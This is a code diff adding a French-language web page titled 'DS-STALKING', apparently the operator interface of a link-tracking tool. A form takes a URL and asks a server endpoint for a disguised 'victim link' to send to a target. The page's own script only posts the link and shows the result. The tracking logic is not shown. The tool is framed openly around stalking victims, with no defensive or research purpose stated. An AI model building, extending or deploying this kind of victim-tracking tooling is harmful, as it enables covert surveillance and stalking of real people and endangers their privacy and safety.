@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DS-STALKING</title>
+</head>
+<body>
+    <h1>Entrez un lien pour générer un lien pour la victime</h1>
+    <form id="linkForm">
+        <input type="text" id="userLink" placeholder="Entrez un lien" required>
+        <button type="submit">Générer le lien</button>
+    </form>
+
+    <h2 id="victimLink"></h2>
+
+    <script>
+        document.getElementById("linkForm").addEventListener("submit", function(e) {
+            e.preventDefault();
+            const userLink = document.getElementById("userLink").value;
+
+            fetch("/victim_link", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ user_link: userLink })
+            })
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById("victimLink").textContent = "Lien pour la victime: " + data.victim_url;
+            })
+            .catch(error => console.error(error));
+        });
+    </script>
+</body>
+</html>
